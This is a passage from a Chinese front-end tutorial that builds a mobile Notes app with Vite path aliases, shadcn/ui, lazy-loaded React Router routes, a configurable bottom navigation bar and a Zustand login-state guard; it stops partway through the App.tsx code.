ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好！👋 欢迎回到 <strong>AI 全栈项目实战</strong> 的第五天。</p>
<p>在过去几天的“特种兵式”训练中，我们已经掌握了 React 的“时空穿梭术”（Router 路由），请来了德国管家（Zustand 状态管理），穿上了 TypeScript 的钢铁侠战衣，还学会了用 NestJS 搭建后端的“精装豪宅”。</p>
<p>今天，我们要把这些零散的宝石串成一条项链。我们要开始实战了！我们将从零开始搭建一个移动端的 <strong>Notes（笔记）应用</strong>。</p>
<p>而且，今天我要向大家介绍一位前端 UI 界的新晋“顶流” —— <strong>shadcn/ui</strong>。如果你受够了 Material UI 或者 Ant Design 那种“千篇一律”的样式，shadcn/ui 绝对会让你打开新世界的大门。它是目前 React 生态中最火的组件库方案，没有之一。</p>
<p>准备好了吗？我们要发车了！🚗</p>
<hr/>
<h2 data-id="heading-0">🛠️ 一、 磨刀不误砍柴工：优雅的项目配置</h2>
<p>在开始写代码之前，我们要先解决几个“长期痛点”。你是不是经常在代码里看到这样的路径：
<code>import Button from '../../../../components/Button'</code>
这种 <code>../../</code> 的地狱不仅难看，而且一旦你移动了文件位置，引用的路径全都要炸。</p>
<h3 data-id="heading-1">1.1 路径别名（Path Alias）：让 <code>@</code> 带你回家</h3>
<p>我们想要的效果是：无论你在哪个深层目录下，只要输入 <code>@/</code>，就代表回到了 <code>src</code> 根目录。编辑器还能智能提示目录下的文件。</p>
<p>首先，我们需要修改 Vite 的配置文件 <code>vite.config.ts</code>。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> react <span class="hljs-keyword">from</span> <span class="hljs-string">'@vitejs/plugin-react'</span>
<span class="hljs-keyword">import</span> tailwindcss <span class="hljs-keyword">from</span> <span class="hljs-string">'@tailwindcss/vite'</span>
<span class="hljs-comment">// 1️⃣ 引入 node 的 path 模块</span>
<span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">'path'</span> 

<span class="hljs-comment">// https://vite.dev/config/</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-title function_">react</span>(),
    <span class="hljs-title function_">tailwindcss</span>()
  ],
  <span class="hljs-comment">// 2️⃣ 配置 resolve.alias</span>
  <span class="hljs-attr">resolve</span>: {
    <span class="hljs-attr">alias</span>: {
      <span class="hljs-comment">// __dirname 是 Node.js 的超级变量，代表当前文件的绝对路径</span>
      <span class="hljs-comment">// path.resolve 负责拼接路径</span>
      <span class="hljs-string">'@'</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'src'</span>),
    },
  }
})
</code></pre>
<p><strong>💡 知识点解析：</strong></p>
<ul>
<li><strong><code>path</code> 模块</strong>：这是 Node.js 的内置模块，专门用来处理文件路径的。</li>
<li><strong><code>__dirname</code></strong>：这是 Node.js 的全局变量，指向当前文件所在的文件夹目录。</li>
<li><strong>TS 报错？</strong>：当你写 <code>import path from 'path'</code> 时，TypeScript 可能会报错说找不到模块。这是因为 TS 默认不知道 Node.js 的内置模块。
<ul>
<li><strong>解决方案</strong>：我们需要安装 Node 的类型声明文件。</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">npm i -D @types/node
</code></pre>
<em>这行命令是告诉 TS：“嘿，别慌，我知道 path 是啥，这是它的说明书。”</em></li>
</ul>
<p>配置完 Vite 还没完，我们还得告诉 TypeScript 这个 <code>@</code> 是什么意思，否则 TS 编译器会报错。
打开 <code>tsconfig.app.json</code>（或者 <code>tsconfig.json</code>）：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"compilerOptions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-comment">// ... 其他配置</span>
    
    <span class="hljs-comment">/* 路径配置 */</span>
    <span class="hljs-attr">"baseUrl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"."</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 基准目录是当前目录</span>
    <span class="hljs-attr">"paths"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"@/*"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"src/*"</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// 告诉 TS：遇到 @/ 开头的路径，去 src/ 下面找</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>这样，我们就彻底告别了 <code>../../</code> 的噩梦，迎来了清爽的 <code>@/components/Header</code>。</p>
<hr/>
<h2 data-id="heading-2">🎨 二、 UI 界的“乐高”：shadcn/ui 初体验</h2>
<h3 data-id="heading-3">2.1 为什么是 shadcn/ui？</h3>
<p>传统的组件库（如 Antd, MUI）是把组件封装在一个黑盒子里（npm 包），你只能通过修改 props 来改变样式。如果你想大改结构？没门。</p>
<p><strong>shadcn/ui</strong> 的理念完全不同。它<strong>不是</strong>一个组件库，它是一个<strong>组件集合</strong>。
当你需要一个 Button 时，它不是让你 <code>npm install @shadcn/button</code>，而是<strong>直接把 Button 组件的源代码下载到你的项目中</strong>（通常是 <code>src/components/ui</code> 目录下）。</p>
<p>这意味着：<strong>你拥有这些组件的完全控制权</strong>。你可以随意修改它的代码、样式、逻辑。它基于 <strong>Tailwind CSS</strong> 构建，样式修改极其方便。</p>
<h3 data-id="heading-4">2.2 初始化 shadcn/ui</h3>
<p>首先，确保你的项目已经安装并配置好了 Tailwind CSS（如果不记得了，请复习之前的文章）。
然后，在项目根目录下运行初始化命令：</p>
<pre><code class="hljs language-bash" lang="bash">npx shadcn@latest init
</code></pre>
<p><strong>💡 知识点解析：npx 是什么？</strong></p>
<ul>
<li><code>npm</code> 是包管理工具（安装、卸载）。</li>
<li><code>npx</code> 是包<strong>执行</strong>工具。</li>
<li><strong>优势</strong>：它不需要你全局安装 <code>shadcn</code>。它会临时下载最新版本的 <code>shadcn</code>，执行完命令后就删除。非常适合这种“一次性”的初始化操作，而且永远用的都是最新版。</li>
</ul>
<p>执行过程中，它会问你一些问题（比如用什么颜色主题、CSS 变量存在哪），一路回车选择默认即可。它会自动检测你的 <code>tsconfig.json</code> 里的别名配置（刚才我们配的 <code>@</code>），非常智能。</p>
<h3 data-id="heading-5">2.3 添加你的第一个组件</h3>
<p>现在，我们想要一个漂亮的按钮。
在终端运行：</p>
<pre><code class="hljs language-bash" lang="bash">npx shadcn@latest add button
</code></pre>
<p>你会发现，你的 <code>src/components/ui</code> 目录下多了一个 <code>button.tsx</code> 文件。
这就是 shadcn 的魔力！代码就在你手里，想怎么改就怎么改。</p>
<p>让我们在 <code>App.tsx</code> 里试一下（伪代码）：</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/ui/button'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">variant</span>=<span class="hljs-string">"default"</span>&gt;</span>我是默认按钮<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">variant</span>=<span class="hljs-string">"destructive"</span>&gt;</span>我是危险按钮<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">variant</span>=<span class="hljs-string">"outline"</span>&gt;</span>我是描边按钮<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
</code></pre>
<p>简直太优雅了！你不需要写一行 CSS，就拥有了企业级设计的按钮。</p>
<hr/>
<h2 data-id="heading-6">🏗️ 三、 项目实战：Notes 应用架构设计</h2>
<p>接下来，我们正式开始搭建 <strong>Notes</strong> 项目。</p>
<h3 data-id="heading-7">3.1 目录结构</h3>
<p>有了路径别名，我们的目录结构可以非常清晰：</p>
<pre><code class="hljs language-bash" lang="bash">src/
├── components/     <span class="hljs-comment"># 公共组件</span>
│   ├── ui/         <span class="hljs-comment"># shadcn 下载的组件</span>
│   ├── Header.tsx  <span class="hljs-comment"># 自己写的业务组件</span>
│   └── ...
├── layouts/        <span class="hljs-comment"># 布局组件</span>
│   └── MainLayout.tsx
├── pages/          <span class="hljs-comment"># 页面组件</span>
│   ├── Home.tsx
│   ├── Login.tsx
│   ├── Mine.tsx
│   └── ...
├── router/         <span class="hljs-comment"># 路由配置</span>
│   └── index.tsx
├── store/          <span class="hljs-comment"># Zustand 状态管理</span>
│   └── useUserStore.ts
├── types/          <span class="hljs-comment"># TS 类型定义</span>
├── App.tsx         <span class="hljs-comment"># 根组件</span>
└── main.tsx        <span class="hljs-comment"># 入口文件</span>
</code></pre>
<h3 data-id="heading-8">3.2 路由架构：App 还是 Main？</h3>
<p>这里有个关键的架构设计点。
通常我们会把 <code>&lt;Router&gt;</code> 包裹在最外层。在本项目中，我们选择在 <code>main.tsx</code> 中包裹 <code>App</code> 组件。</p>
<p><strong>为什么？</strong>
因为我们希望在 <code>App.tsx</code> 中使用 <code>useNavigate</code> 或 <code>useLocation</code> 等 Hooks 来做全局的权限控制（比如未登录跳转）。<strong>这些 Hooks 必须在 Router 的上下文（Context）内部才能运行。</strong>
如果 <code>App.tsx</code> 自己渲染 <code>&lt;Router&gt;</code>，那它自己就不在 Router 内部，就用不了这些 Hooks。</p>
<p>所以，我们在 <code>main.tsx</code> 这样做：</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { createRoot } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-dom/client'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">RouterConfig</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/router/index.tsx'</span> <span class="hljs-comment">// 引入我们封装的 Router 组件</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'./index.css'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.tsx'</span>

<span class="hljs-title function_">createRoot</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'root'</span>)!).<span class="hljs-title function_">render</span>(
  <span class="hljs-comment">// RouterConfig 内部包含了 &lt;BrowserRouter&gt;</span>
  <span class="hljs-comment">// App 作为 children 传入，这样 App 就在 Router 内部了</span>
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">RouterConfig</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">RouterConfig</span>&gt;</span></span>,
)
</code></pre>
<h3 data-id="heading-9">3.3 路由配置：懒加载与 Suspense</h3>
<p>打开 <code>src/router/index.tsx</code>，这里是我们应用的交通枢纽。</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Suspense</span>, lazy } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">BrowserRouter</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">Router</span>, <span class="hljs-title class_">Routes</span>, <span class="hljs-title class_">Route</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-router-dom'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Loading</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/Loading'</span>; <span class="hljs-comment">// 自定义的 Loading 组件</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">MainLayout</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/layouts/MainLayout'</span>;

<span class="hljs-comment">// 🚀 路由懒加载 (Lazy Loading)</span>
<span class="hljs-comment">// 只有当用户访问这个页面时，浏览器才会去下载这个页面的 JS 代码。</span>
<span class="hljs-comment">// 这对于移动端应用至关重要，能极大提升首屏加载速度。</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Home</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'@/pages/Home'</span>));
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Mine</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'@/pages/Mine'</span>));
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Login</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'@/pages/Login'</span>));
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Order</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'@/pages/Order'</span>))
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Chat</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'@/pages/Chat'</span>))

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">RouterConfig</span>(<span class="hljs-params">{children}: {children?: React.ReactNode}</span>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Router</span>&gt;</span>
      {/* Suspense 是 React 的内置组件，用于处理异步加载的状态 */}
      {/* fallback 属性接受一个组件，在页面还没加载出来时显示（比如转圈圈） */}
      <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Loading</span>/&gt;</span>}&gt;
        <span class="hljs-tag">&lt;<span class="hljs-name">Routes</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">"/login"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Login</span> /&gt;</span>}/&gt;
          
          {/* 📦 嵌套路由布局 */}
          {/* MainLayout 包含了底部的导航栏，所有子路由都会显示在这个布局里 */}
          <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">"/"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">MainLayout</span>/&gt;</span>}&gt;
            <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">""</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Home</span> /&gt;</span>} /&gt;
            <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">"mine"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Mine</span> /&gt;</span>} /&gt;
            <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">"order"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Order</span> /&gt;</span>} /&gt;
            <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">"chat"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Chat</span> /&gt;</span>} /&gt;
          <span class="hljs-tag">&lt;/<span class="hljs-name">Route</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span>
      {/* 渲染传入的子组件 (App.tsx) */}
      {children}
    <span class="hljs-tag">&lt;/<span class="hljs-name">Router</span>&gt;</span></span>
  )
}
</code></pre>
<p>这里我们复习了几个核心知识点：</p>
<ol>
<li><strong><code>lazy</code></strong>: 动态导入组件。</li>
<li><strong><code>Suspense</code></strong>: 必须配合 <code>lazy</code> 使用，提供加载时的占位符。我们这里写了一个 <code>Loading</code> 组件（虽然代码简单，但提升了体验）。</li>
<li><strong>嵌套路由</strong>: <code>&lt;Route path="/" element={&lt;MainLayout/&gt;}&gt;</code>。这意味着 <code>Home</code>, <code>Mine</code> 等页面都会作为 <code>MainLayout</code> 的子元素渲染。</li>
</ol>
<hr/>
<h2 data-id="heading-10">🧭 四、 导航系统：MainLayout 与 BottomNav</h2>
<h3 data-id="heading-11">4.1 布局容器 (MainLayout)</h3>
<p><code>src/layouts/MainLayout.tsx</code> 充当了页面的骨架。</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Outlet</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-router-dom'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">BottomNav</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/BottomNav'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">MainLayout</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"min-h-screen bg-gray-50 pb-16"</span>&gt;</span>
      {/* 📺 Outlet 是子路由的出口 */}
      {/* 当 URL 是 /mine 时，<span class="hljs-tag">&lt;<span class="hljs-name">Mine</span> /&gt;</span> 就会显示在这里 */}
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"h-full w-full"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Outlet</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      
      {/* 底部导航栏，永远固定在底部 */}
      <span class="hljs-tag">&lt;<span class="hljs-name">BottomNav</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
</code></pre>
<h3 data-id="heading-12">4.2 智能底栏 (BottomNav)</h3>
<p>这是本项目的亮点之一。我们没有把导航写死，而是用<strong>配置化</strong>的方式。
打开 <code>src/components/BottomNav.tsx</code>。</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Home</span>, <span class="hljs-title class_">User</span>, <span class="hljs-title class_">ListOrdered</span>, <span class="hljs-title class_">MessageCircle</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'lucide-react'</span>; <span class="hljs-comment">// 漂亮的图标库</span>
<span class="hljs-keyword">import</span> { useNavigate, useLocation } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-router-dom'</span>;
<span class="hljs-keyword">import</span> { cn } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/lib/utils'</span>; <span class="hljs-comment">// shadcn 提供的类名合并工具</span>
<span class="hljs-keyword">import</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/store/useUserStore'</span>
<span class="hljs-keyword">import</span> { needsLoginPath } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/App'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">BottomNav</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> navigate  = <span class="hljs-title function_">useNavigate</span>();
  <span class="hljs-keyword">const</span> { pathname } = <span class="hljs-title function_">useLocation</span>(); <span class="hljs-comment">// 获取当前路径</span>
  <span class="hljs-keyword">const</span> { isLogin } = <span class="hljs-title function_">useUserStore</span>(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> state); <span class="hljs-comment">// 从 Zustand 获取登录状态</span>

  <span class="hljs-comment">// 📝 配置数组：想加新菜单？在这里加一个对象就行了！</span>
  <span class="hljs-keyword">const</span> tabs = [
    { <span class="hljs-attr">label</span>: <span class="hljs-string">"首页"</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">"/"</span>, <span class="hljs-attr">icon</span>: <span class="hljs-title class_">Home</span> },
    { <span class="hljs-attr">label</span>: <span class="hljs-string">"聊天"</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">"/chat"</span>, <span class="hljs-attr">icon</span>: <span class="hljs-title class_">MessageCircle</span> },
    { <span class="hljs-attr">label</span>: <span class="hljs-string">"订单"</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">"/order"</span>, <span class="hljs-attr">icon</span>: <span class="hljs-title class_">ListOrdered</span> },
    { <span class="hljs-attr">label</span>: <span class="hljs-string">"我的"</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">"/mine"</span>, <span class="hljs-attr">icon</span>: <span class="hljs-title class_">User</span> }
  ]

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleNav</span> = (<span class="hljs-params">path: <span class="hljs-built_in">string</span></span>) =&gt; {
    <span class="hljs-comment">// 1. 如果点击的是当前页面，啥也不做</span>
    <span class="hljs-keyword">if</span> (path === pathname) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-comment">// 2. 🛡️ 权限守卫：如果目标页面需要登录，且用户未登录</span>
    <span class="hljs-keyword">if</span> (needsLoginPath.<span class="hljs-title function_">includes</span>(path) &amp;&amp; !isLogin) {
      <span class="hljs-title function_">navigate</span>(<span class="hljs-string">"/login"</span>); <span class="hljs-comment">// 踢去登录页</span>
      <span class="hljs-keyword">return</span>;
    }
    
    <span class="hljs-comment">// 3. 正常跳转</span>
    <span class="hljs-title function_">navigate</span>(path);
  }

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"fixed bottom-0 left-0 right-0 h-16 border-t bg-background flex items-center justify-around z-50 safe-area-bottom"</span>&gt;</span>
    {
      tabs.map((tab) =&gt; {
        const Icon = tab.icon;
        // 判断当前 tab 是否被激活
        const isActive = pathname === tab.path;

        return (
          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> 
            <span class="hljs-attr">key</span>=<span class="hljs-string">{tab.path}</span>
            <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> handleNav(tab.path)}
            className="flex flex-col items-center justify-center w-full h-full space-y-1"
          &gt;
            {/* 图标变色逻辑 */}
            <span class="hljs-tag">&lt;<span class="hljs-name">Icon</span> 
              <span class="hljs-attr">size</span>=<span class="hljs-string">{24}</span> 
              <span class="hljs-attr">className</span>=<span class="hljs-string">{cn(</span>"<span class="hljs-attr">transition-colors</span>", 
                <span class="hljs-attr">isActive</span> ? "<span class="hljs-attr">text-primary</span>" <span class="hljs-attr">:</span> "<span class="hljs-attr">text-muted-foreground</span>"
              )}
            /&gt;</span>
            {/* 文字变色逻辑 */}
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{cn(</span>"<span class="hljs-attr">text-xs</span> <span class="hljs-attr">transition-colors</span>", 
              <span class="hljs-attr">isActive</span> ? "<span class="hljs-attr">text-primary</span> <span class="hljs-attr">font-medium</span>"<span class="hljs-attr">:</span> "<span class="hljs-attr">text-muted-foreground</span>")}&gt;</span>
              {tab.label}
            <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        )
      })
    }
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
</code></pre>
<p><strong>💡 核心逻辑解析：</strong></p>
<ol>
<li><strong>Icon Component</strong>: <code>const Icon = tab.icon;</code> React 允许我们将组件作为变量传递。</li>
<li><strong><code>cn()</code> 函数</strong>: 这是 shadcn 提供的一个神级工具（基于 <code>clsx</code> 和 <code>tailwind-merge</code>）。它可以让你动态拼接类名，并且自动解决 Tailwind 类名冲突的问题。
<ul>
<li>比如：<code>cn("bg-red-500", isActive &amp;&amp; "bg-blue-500")</code>。</li>
</ul>
</li>
<li><strong>权限控制</strong>: 我们引入了 <code>needsLoginPath</code> 数组（稍后在 App.tsx 定义），如果用户没登录想点“我的”，直接拦截。</li>
</ol>
<hr/>
<h2 data-id="heading-13">🔐 五、 全局状态与权限守卫</h2>
<h3 data-id="heading-14">5.1 状态仓库 (Zustand)</h3>
<p>复习一下 Zustand。在 <code>src/store/useUserStore.ts</code>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { create } <span class="hljs-keyword">from</span> <span class="hljs-string">'zustand'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">User</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/types'</span>; <span class="hljs-comment">// 引入类型定义</span>

<span class="hljs-comment">// 1. 定义 Store 的形状 (Interface)</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserStore</span> {
    <span class="hljs-attr">isLogin</span>: <span class="hljs-built_in">boolean</span>;
    <span class="hljs-attr">user</span>: <span class="hljs-title class_">User</span> | <span class="hljs-literal">null</span>; <span class="hljs-comment">// User 或者是 null</span>
}

<span class="hljs-comment">// 2. 创建 Store</span>
<span class="hljs-comment">// create&lt;UserStore&gt; 使用泛型约束，保证代码提示和类型安全</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useUserStore = create&lt;<span class="hljs-title class_">UserStore</span>&gt;(<span class="hljs-function">(<span class="hljs-params">set</span>) =&gt;</span> ({
    <span class="hljs-attr">isLogin</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// 默认未登录</span>
    <span class="hljs-attr">user</span>: <span class="hljs-literal">null</span>
}))
</code></pre>
<p>简单、纯粹。没有 Redux 那些复杂的样板代码。</p>
<h3 data-id="heading-15">5.2 全局路由守卫 (App.tsx)</h3>
<p>虽然我们在 <code>BottomNav</code> 里做了拦截，但如果用户直接在浏览器地址栏输入 <code>/mine</code> 怎么办？
我们需要在 <code>App.tsx</code> 里做一个全局的“安检门”。</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/store/useUserStore'</span>
<span class="hljs-keyword">import</span> { useNavigate, useLocation } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-router-dom'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">BackToTop</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/BackToTop'</span>;

<span class="hljs-comment">// 导出需要登录才能访问的路径列表，供其他组件（如 BottomNav）使用</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> needsLoginPath = [<span class="hljs-string">'/mine'</span>,<span class="hljs-string">'/order'</span>,<span class="hljs-string">'/chat'</span>]

<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> { isLogin } = <span class="hljs-title function_">useUserStore</span>();
  <span class="hljs-keyword">const</span> navigate = <span class="hljs-title function_">useNavigate</span>();
  <span class="hljs-keyword">const</span> { pathname } = <span class="hljs-title function_">useLocation</span>();

  <span class="hljs-comment">// 🛡️ useEffect 监听器</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 如果未登录 且 当前路径在受保护列表里</span>
    <span class="hljs-keyword">if</span>(!isLogin &amp;&amp; needsLoginPath.<span class="hljs-title function_">includes</span>(pathname)) {
